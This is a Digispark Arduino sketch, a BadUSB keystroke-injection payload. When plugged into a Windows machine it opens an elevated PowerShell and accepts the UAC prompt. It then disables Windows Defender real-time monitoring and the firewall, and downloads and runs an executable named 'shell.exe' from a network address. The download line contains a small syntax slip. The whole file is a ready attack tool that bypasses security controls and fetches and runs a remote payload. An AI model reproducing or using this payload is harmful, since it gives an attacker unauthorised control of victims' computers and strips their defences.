// download and run an executable from server

#include "DigiKeyboard.h"
void setup() {
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell Start-Process powershell -Verb runAs");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_Y,MOD_ALT_LEFT);
  DigiKeyboard.delay(1000);
  //Disable windows firewall and defender
  DigiKeyboard.println("Set-MpPreference -DisableRealtimeMonitoring $true"); 
  DigiKeyboard.delay(300);
  DigiKeyboard.println("Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False");
  DigiKeyboard.delay(300);
  // change 'http://192.168.0.24/shell.exe' to wherever you wish to download your executable from
  DigiKeyboard.println("$d = New-Object System.Net.WebClient;$f = 'FILENAME.exe';$url='http://192.168.0.24/shell.exe'$;d.DownloadFile($url,$f);$e = New-Object -com shell.application; $e.shellexecute($f);exit;");
  DigiKeyboard.delay(500);
  while(1);
}
